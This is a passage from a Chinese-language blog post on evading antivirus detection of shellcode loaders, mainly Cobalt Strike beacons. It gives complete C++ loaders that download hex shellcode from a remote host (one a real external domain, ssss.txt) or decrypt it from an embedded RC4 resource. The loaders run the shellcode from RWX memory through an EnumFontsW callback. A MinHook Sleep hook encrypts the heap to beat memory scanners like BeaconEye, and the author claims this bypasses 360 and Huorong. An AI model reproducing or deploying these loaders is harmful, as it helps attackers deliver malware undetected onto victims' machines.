class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    LPSTR url &#x3D; (char*)&quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;shellcode_hex.txt&quot;; </span><br><span class=\"line\">    std::vector&lt;unsigned char&gt; buffer;</span><br><span class=\"line\">    size_t size &#x3D; GetUrl_HexContent(url, buffer);</span><br><span class=\"line\">    char* exec &#x3D; (char*)LI_FN(VirtualAlloc)(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    memcpy(exec, buffer.data(), size);</span><br><span class=\"line\">    ((void(*) ())exec)();</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>socket静态免杀版，同样使用 lazy_importer </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;winsock2.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;string&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &quot;lazy_importer.hpp&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">#pragma comment(lib, &quot;ws2_32.lib&quot;)</span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">char* readUrl(const char* szUrl, long&amp; fileSize)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    WSADATA wsaData;</span><br><span class=\"line\">    if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) !&#x3D; 0)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        cerr &lt;&lt; &quot;WSAStartup failed.&quot; &lt;&lt; endl;</span><br><span class=\"line\">        return nullptr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    string server, filepath;</span><br><span class=\"line\">    size_t pos &#x3D; string(szUrl).find(&quot;:&#x2F;&#x2F;&quot;);</span><br><span class=\"line\">    if (pos !&#x3D; string::npos)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        string url &#x3D; string(szUrl).substr(pos + 3);</span><br><span class=\"line\">        pos &#x3D; url.find(&#39;&#x2F;&#39;);</span><br><span class=\"line\">        server &#x3D; url.substr(0, pos);</span><br><span class=\"line\">        filepath &#x3D; (pos !&#x3D; string::npos) ? url.substr(pos) : &quot;&#x2F;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    SOCKET conn &#x3D; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class=\"line\">    if (conn &#x3D;&#x3D; INVALID_SOCKET)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        WSACleanup();</span><br><span class=\"line\">        return nullptr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    struct hostent* hp &#x3D; gethostbyname(server.c_str());</span><br><span class=\"line\">    if (hp &#x3D;&#x3D; NULL)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        closesocket(conn);</span><br><span class=\"line\">        WSACleanup();</span><br><span class=\"line\">        return nullptr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    struct sockaddr_in serverAddr;</span><br><span class=\"line\">    memset(&amp;serverAddr, 0, sizeof(serverAddr));</span><br><span class=\"line\">    serverAddr.sin_family &#x3D; AF_INET;</span><br><span class=\"line\">    serverAddr.sin_port &#x3D; htons(80);</span><br><span class=\"line\">    memcpy(&amp;serverAddr.sin_addr, hp-&gt;h_addr, hp-&gt;h_length);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (connect(conn, (struct sockaddr*)&amp;serverAddr, sizeof(serverAddr)) &#x3D;&#x3D; SOCKET_ERROR)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        closesocket(conn);</span><br><span class=\"line\">        WSACleanup();</span><br><span class=\"line\">        return nullptr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    string getRequest &#x3D; &quot;GET &quot; + filepath + &quot; HTTP&#x2F;1.0\\r\\nHost: &quot; + server + &quot;\\r\\n\\r\\n&quot;;</span><br><span class=\"line\">    if (send(conn, getRequest.c_str(), getRequest.length(), 0) &#x3D;&#x3D; SOCKET_ERROR)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        closesocket(conn);</span><br><span class=\"line\">        WSACleanup();</span><br><span class=\"line\">        return nullptr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    char readBuffer[512];</span><br><span class=\"line\">    string responseData;</span><br><span class=\"line\">    while (true)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        int bytesRead &#x3D; recv(conn, readBuffer, sizeof(readBuffer), 0);</span><br><span class=\"line\">        if (bytesRead &lt;&#x3D; 0)</span><br><span class=\"line\">            break;</span><br><span class=\"line\">        responseData.append(readBuffer, bytesRead);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    int headerEndPos &#x3D; responseData.find(&quot;\\r\\n\\r\\n&quot;);</span><br><span class=\"line\">    if (headerEndPos &#x3D;&#x3D; string::npos)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        closesocket(conn);</span><br><span class=\"line\">        WSACleanup();</span><br><span class=\"line\">        return nullptr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    fileSize &#x3D; responseData.length() - headerEndPos - 4;</span><br><span class=\"line\">    char* result &#x3D; new char[fileSize + 1];</span><br><span class=\"line\">    memcpy(result, responseData.c_str() + headerEndPos + 4, fileSize);</span><br><span class=\"line\">    result[fileSize] &#x3D; &#39;\\0&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">    closesocket(conn);</span><br><span class=\"line\">    WSACleanup();</span><br><span class=\"line\">    return result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">const char* concat(const char* str1, const char* str2) &#123;</span><br><span class=\"line\">    size_t len1 &#x3D; strlen(str1);</span><br><span class=\"line\">    size_t len2 &#x3D; strlen(str2);</span><br><span class=\"line\">    size_t len_total &#x3D; len1 + len2;</span><br><span class=\"line\">    char* result &#x3D; new char[len_total + 1];</span><br><span class=\"line\">    memcpy(result, str1, len1);</span><br><span class=\"line\">    memcpy(result + len1, str2, len2);</span><br><span class=\"line\">    result[len_total] &#x3D; &#39;\\0&#39;;</span><br><span class=\"line\">    return result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char hexCharToByte(char character) &#123;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;0&#39;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;a&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;A&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void hexStringToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class=\"line\">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    const char* str1 &#x3D; &quot;http&quot;;</span><br><span class=\"line\">    const char* str2 &#x3D; &quot;:&#x2F;&#x2F;hwm-china.com&#x2F;ssss.txt&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    const char* szUrl &#x3D; concat(str1, str2);</span><br><span class=\"line\">    long fileSize;</span><br><span class=\"line\">    string data &#x3D; readUrl(szUrl, fileSize);</span><br><span class=\"line\"></span><br><span class=\"line\">    const size_t length &#x3D; data.size() &#x2F; 2; &#x2F;&#x2F; 字节长度</span><br><span class=\"line\"></span><br><span class=\"line\">    unsigned char* exec &#x3D; (unsigned char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    &#x2F;&#x2F; 调用函数将十六进制字符串转换为字节型数组</span><br><span class=\"line\">    hexStringToBytes(data, exec, length);</span><br><span class=\"line\">    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)exec, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240505214645485.png\" alt=\"image-20240505214645485\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240507110929004.png\" alt=\"image-20240507110929004\"></p>\n<h2 id=\"资源释放\"><a href=\"#资源释放\" class=\"headerlink\" title=\"资源释放\"></a>资源释放</h2><p><a href=\"https://www.cnblogs.com/mykr3/p/17905122.html\">免杀-绕过静态动态查杀 - mykr3</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/jTpAnS6MzARafKfMMdP_wA\">某0资源释放免杀</a></p>\n<p>就是往项目资源里添加东西，然后释放资源，再做个shellcode loader</p>\n<p>右键项目-&gt;添加-&gt;资源-&gt;导入-&gt;选择要导入的shellcode或者raw文件。这里用的calc的shellcode测试</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240506235315824.png\" alt=\"image-20240506235315824\"></p>\n<p>加个rc4</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;winsock2.h&gt;</span><br><span class=\"line\">#include&quot;resource.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &quot;lazy_importer.hpp&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">#define size_b 256</span><br><span class=\"line\">unsigned char sbox[257] &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;初始化s表</span><br><span class=\"line\">void init_sbox(unsigned char* key) &#123;</span><br><span class=\"line\">    unsigned int i, j, k;</span><br><span class=\"line\">    int tmp;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class=\"line\">        sbox[i] &#x3D; i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    j &#x3D; k &#x3D; 0;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; size_b; i++) &#123;</span><br><span class=\"line\">        tmp &#x3D; sbox[i];</span><br><span class=\"line\">        j &#x3D; (j + tmp + key[k]) % size_b;</span><br><span class=\"line\">        sbox[i] &#x3D; sbox[j];</span><br><span class=\"line\">        sbox[j] &#x3D; tmp;</span><br><span class=\"line\">        if (++k &gt;&#x3D; strlen((char*)key))k &#x3D; 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;加解密函数</span><br><span class=\"line\">void enc_dec(unsigned char* key, unsigned char* data) &#123;</span><br><span class=\"line\">    int i, j, k, R, tmp;</span><br><span class=\"line\">    init_sbox(key);</span><br><span class=\"line\"></span><br><span class=\"line\">    j &#x3D; k &#x3D; 0;</span><br><span class=\"line\">    for (i &#x3D; 0; i &lt; strlen((char*)data); i++) &#123;</span><br><span class=\"line\">        j &#x3D; (j + 1) % size_b;</span><br><span class=\"line\">        k &#x3D; (k + sbox[j]) % size_b;</span><br><span class=\"line\"></span><br><span class=\"line\">        tmp &#x3D; sbox[j];</span><br><span class=\"line\">        sbox[j] &#x3D; sbox[k];</span><br><span class=\"line\">        sbox[k] &#x3D; tmp;</span><br><span class=\"line\"></span><br><span class=\"line\">        R &#x3D; sbox[(sbox[j] + sbox[k]) % size_b];</span><br><span class=\"line\"></span><br><span class=\"line\">        data[i] ^&#x3D; R;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char hexCharToByte(char character) &#123;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;0&#39; &amp;&amp; character &lt;&#x3D; &#39;9&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;0&#39;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;a&#39; &amp;&amp; character &lt;&#x3D; &#39;f&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;a&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if (character &gt;&#x3D; &#39;A&#39; &amp;&amp; character &lt;&#x3D; &#39;F&#39;) &#123;</span><br><span class=\"line\">        return character - &#39;A&#39; + 10;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void hexToBytes(const std::string&amp; hexString, unsigned char* byteArray, int byteArraySize) &#123;</span><br><span class=\"line\">    for (int i &#x3D; 0; i &lt; hexString.length(); i +&#x3D; 2) &#123;</span><br><span class=\"line\">        byteArray[i &#x2F; 2] &#x3D; hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">    HRSRC Png &#x3D; FindResource(NULL, MAKEINTRESOURCE(IDR_MYRES1), &quot;MYRES&quot;);</span><br><span class=\"line\">    HGLOBAL LoadPng &#x3D; LoadResource(NULL, Png);</span><br><span class=\"line\">    DWORD PngSize &#x3D; SizeofResource(NULL, Png);</span><br><span class=\"line\">    LPVOID PngData &#x3D; LockResource(LoadPng);</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    const size_t length &#x3D; PngSize &#x2F; 2; &#x2F;&#x2F; 字节长度</span><br><span class=\"line\">    unsigned char* mypng &#x3D; (unsigned char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    char* charPtr &#x3D; reinterpret_cast&lt;char*&gt;(PngData);</span><br><span class=\"line\">    hexToBytes((string)charPtr, mypng, length);</span><br><span class=\"line\">    unsigned char key[] &#x3D; &quot;baidu.com&quot;;</span><br><span class=\"line\">    enc_dec(key, mypng);</span><br><span class=\"line\">    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)mypng, NULL);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240507104803245.png\" alt=\"image-20240507104803245\"></p>\n<h1 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h1><p>总的来说，目前为止学会上面的 shellcode加载、shellcode加密、分离免杀后，搭配下面的 杂项 内容，基本动静态绕过360/火绒已经基本不是问题了。绕过QVM的主要方法就是添加资源、添加资源、还是TM的添加资源，尽量不要让程序太小，之前没有添加资源的时候编译出来200kb左右，很难直接免杀。火绒直接用远程拉取就行。</p>\n<h1 id=\"内存动态免杀\"><a href=\"#内存动态免杀\" class=\"headerlink\" title=\"内存动态免杀\"></a>内存动态免杀</h1><p><a href=\"https://www.blackhillsinfosec.com/avoiding-memory-scanners/\">Avoiding Memory Scanners</a>，文章提出三种扫描检测方向：</p>\n<ol>\n<li>利用yara在内存中匹配cobalt strike相关字符串/字节</li>\n<li>内存页面属性</li>\n<li>堆栈跟踪</li>\n</ol>\n<p>给出了几种bypass方向</p>\n<ol>\n<li>动态堆加/解密</li>\n<li>避免睡眠</li>\n<li>属性修改</li>\n<li>堆栈欺骗</li>\n</ol>\n<h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><p>要在内存中免杀，首先要知道cs在内存中是怎么活动的或者说知道cs的 beacon 从生成到上线再到执行的整个流程。</p>\n<p>文章：<a href=\"https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&__biz=MzkxMTMxMjI2OQ==&scene=23&album_id=2280727834220429320\">CobaltStrike逆向学习系列</a>    <a href=\"https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao\">Cobalt Strike原理介绍</a>   <a href=\"https://tttang.com/archive/1631/\">CobaltStrike Beacon生成原理分析</a>  <a href=\"https://forum.butian.net/share/2017\">Cobaltstrike4.0 shellcode分析</a></p>\n<p>从流程中总结出内存特征</p>\n<p>文章：<a href=\"https://blog.nsfocus.net/beaconeye-cs/\">从BeaconEye说起，围绕CS内存特征的检测与规避</a>     <a href=\"https://mp.weixin.qq.com/s/_gSPWVb1b-xuvhU6ynmw0Q\">如何正确的 “手撕” Cobalt Strike</a></p>\n<p>最后根据特征bypass。</p>\n<h2 id=\"动态堆加-解密\"><a href=\"#动态堆加-解密\" class=\"headerlink\" title=\"动态堆加/解密\"></a>动态堆加/解密</h2><h3 id=\"minhook\"><a href=\"#minhook\" class=\"headerlink\" title=\"minhook\"></a>minhook</h3><p>一个用于hook winapi的稳定库，下载Releases中的lib.zip，<a href=\"https://github.com/TsudaKageyu/minhook\">TsudaKageyu/minhook: The Minimalistic x86/x64 API Hooking Library for Windows</a></p>\n<p>项目中新建include、libs文件夹，如下结构</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508093423537.png\" alt=\"image-20240508093423537\"></p>\n<p>并添加目录进行引用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508093253085.png\" alt=\"image-20240508093253085\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508093345168.png\" alt=\"image-20240508093345168\"></p>\n<p>测试</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508093500489.png\" alt=\"image-20240508093500489\"></p>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><ol>\n<li>hook Sleep()</li>\n<li>运行shellcode上线</li>\n<li>触发MyHookedSleep()</li>\n<li>挂起进程</li>\n<li>加密当前线程的所有堆空间</li>\n<li>Sleep()</li>\n<li>解密当前线程的所有堆空间</li>\n<li>恢复进程</li>\n</ol>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>直接给出代码，Ref：<a href=\"https://github.com/waldo-irc/LockdExeDemo\">waldo-irc/LockdExeDemo</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;MinHook.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &quot;lazy_importer.hpp&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#include &quot;Thread.h&quot;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">#if defined _M_X64</span><br><span class=\"line\">#pragma comment(lib, &quot;libMinHook-x64-v141-mt.lib&quot;)</span><br><span class=\"line\">#elif defined _M_IX86</span><br><span class=\"line\">#pragma comment(lib, &quot;libMinHook-x86-v141-mt.lib&quot;)</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------define hook func----------------------------------*&#x2F;</span><br><span class=\"line\">void (WINAPI* OldSleep)(DWORD dwMiliseconds);</span><br><span class=\"line\">void (WINAPI MyHookedSleep)(DWORD dwMiliseconds);</span><br><span class=\"line\"></span><br><span class=\"line\">template &lt;typename T&gt;</span><br><span class=\"line\">inline MH_STATUS MH_CreateHookApiEx(</span><br><span class=\"line\">    LPCWSTR pszModule, LPCSTR pszProcName, LPVOID pDetour, T** ppOriginal)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return MH_CreateHookApi(</span><br><span class=\"line\">        pszModule, pszProcName, pDetour, reinterpret_cast&lt;LPVOID*&gt;(ppOriginal));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL Hook()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (MH_Initialize() !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    if (MH_CreateHookApiEx(L&quot;kernel32&quot;, &quot;Sleep&quot;, &amp;MyHookedSleep, &amp;OldSleep) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    if (MH_EnableHook(MH_ALL_HOOKS) !&#x3D; MH_OK) &#123; return false; &#125;</span><br><span class=\"line\">    return true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------encrypt heap--------------------------------------*&#x2F;</span><br><span class=\"line\">const char key[9] &#x3D; &quot;Aoliao66&quot;;  &#x2F;&#x2F; Encryption Key</span><br><span class=\"line\">size_t keySize &#x3D; sizeof(key);</span><br><span class=\"line\"></span><br><span class=\"line\">void xor_bidirectional_encode(const char* key, const size_t keyLength, char* buffer, const size_t length) &#123;</span><br><span class=\"line\">    for (size_t i &#x3D; 0; i &lt; length; ++i) &#123;</span><br><span class=\"line\">        buffer[i] ^&#x3D; key[i % keyLength];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">PROCESS_HEAP_ENTRY entry;</span><br><span class=\"line\">void HeapEncryptDecrypt() &#123;</span><br><span class=\"line\">    SecureZeroMemory(&amp;entry, sizeof(entry));</span><br><span class=\"line\">    while (HeapWalk(GetProcessHeap(), &amp;entry)) &#123;</span><br><span class=\"line\">        if ((entry.wFlags &amp; PROCESS_HEAP_ENTRY_BUSY) !&#x3D; 0) &#123;</span><br><span class=\"line\">            xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*-------------------------my hook-sleep func--------------------------------*&#x2F;</span><br><span class=\"line\">void WINAPI MyHookedSleep(DWORD dwMiliseconds)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DWORD time &#x3D; dwMiliseconds;</span><br><span class=\"line\">    if (time &gt; 1000) &#123;</span><br><span class=\"line\">        DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class=\"line\">        HeapEncryptDecrypt();</span><br><span class=\"line\"></span><br><span class=\"line\">        OldSleep(dwMiliseconds);</span><br><span class=\"line\"></span><br><span class=\"line\">        HeapEncryptDecrypt();</span><br><span class=\"line\">        DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else &#123;</span><br><span class=\"line\">        OldSleep(time);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (!Hook()) &#123; return 1; &#125;</span><br><span class=\"line\">    unsigned char buf[] &#x3D; &quot;\\xfc\\x48\\x83\\xe4\\xf0...&quot;;  &#x2F;&#x2F; shellcode is here</span><br><span class=\"line\">    const size_t length &#x3D; sizeof(buf);</span><br><span class=\"line\">    unsigned char* mypng &#x3D; (unsigned char*)LI_FN(VirtualAlloc)(nullptr, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    RtlMoveMemory(mypng, buf, length);</span><br><span class=\"line\">    EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)mypng, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译好的BeaconEye：<a href=\"https://github.com/yongsheng220/beaconeye\">beaconeye</a>，BeaconEye直接扫到</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508130409497.png\" alt=\"image-20240508130409497\"></p>\n<p>处理后</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508144113176.png\" alt=\"image-20240508144113176\"></p>\n<p>Ref：<a href=\"https://www.arashparsa.com/hook-heaps-and-live-free/\">Hook Heaps and Live Free</a>、<a href=\"https://mp.weixin.qq.com/s/vrGQ2L-XpMgRqjJxKQhuZQ\">安全开发之堆分配内存加密</a> 、<a href=\"https://mp.weixin.qq.com/s/kJzyjYvWMWoHJJ8LIwodVQ\">【免杀】初探卡巴–堆加密</a> </p>\n<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>这种方式的缺陷或者说比较丑陋的一点是将当前线程挂起，将当前进程所有heap加密，如果现在有注入到其他进程的需求，缺陷就体现的淋漓尽致，会导致宿主进程因为挂起而不稳定甚至崩溃。</p>\n<h2 id=\"属性修改\"><a href=\"#属性修改\" class=\"headerlink\" title=\"属性修改\"></a>属性修改</h2><p>通过hook sleep后将恶意代码所在内存的属性修改为RW。</p>\n<h3 id=\"回顾\"><a href=\"#回顾\" class=\"headerlink\" title=\"回顾\"></a>回顾</h3><p>实现堆加密的目的就是要掩盖恶意代码在内存中的特征，如何在heap中精准定位shellcode？回顾beacon的加载流程为三步</p>\n<ol>\n<li>shellcode(stager)从c2拉取stage(加密beacon.dll)</li>\n<li>开辟新空间，解密stage(beacon.dll)出反射DLL，并调用reflectiveloader</li>\n<li>开辟新空间，将解密的beacon.dll复制到新空间，调用dllmain</li>\n</ol>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240508225544787.png\" alt=\"image-20240508225544787\"></p>\n<p>这里就能提出两个问题：</p>\n<p>一、三步中都开辟了新空间，可以hook对应开辟空间的函数从而精准获得恶意代码内存地址，那么应该hook哪个函数？</p>\n<p>二、能否扫描出heap空间特殊的内存属性？因为开辟的空间一定存在的特征是私有提交(private commit)、可执行(X)的属性</p>\n<p>只要解决这两个问题就是两个不同的精准找内存的方法。</p>\n<h3 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>这里简单说下两个问题的解决方法。</p>\n<p>一：stage开辟空间的函数收到c2 profile的影响，profile中的stage规定了allocator的参数作为内存分配的函数，有三个 <code>VirtualAlloc</code> <code>HeapAlloc</code> <code>MapViewOfFile</code> 默认为 VirtualAlloc。所以我们只要hook这三个函数之一，最少可以得到两个地址，然后同时hook Sleep对这两个地址利用 <code>VirtualProtect</code> 修改内存属性。</p>\n<p>hook VirtualAlloc 代码示例：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">LPVOID WINAPI MyHookedVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    LPVOID address &#x3D; OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class=\"line\">    printf(&quot;address &#x3D; 0X%p\\n&quot;, address);</span><br><span class=\"line\">    return address;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>hook后第一个地址为自己开辟内存执行shellcode的内存地址(RWX)</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/bypassav/image-20240509152718366.png\" alt=\"image-20240509152718366\"></p>\n<p>二：遍历扫描内存页，标记特殊属性的页面地址，然后hook Sleep进行翻转属性。这是我所能找到的文章普遍采用的方法</p>\n<p>直接贴两个文章：<a href=\"https://maidang.cool/2022/26991.html#Stager\">翻转cs beacon属性页</a>、<a href=\"https://forum.butian.net/share/2620\">一次cs样本免杀实践</a></p>\n<h3 id=\"Malleable-PE-Stage\"><a href=\"#Malleable-PE-Stage\" class=\"headerlink\" title=\"Malleable PE/Stage\"></a>Malleable PE/Stage</h3><p>首先要介绍profile中的配置，你可以在profile中stage标签实现beacon的元数据修改、在内存中的属性、数据的替换、加解密混淆等。</p>\n<ul>\n<li><p>sleep_mask： 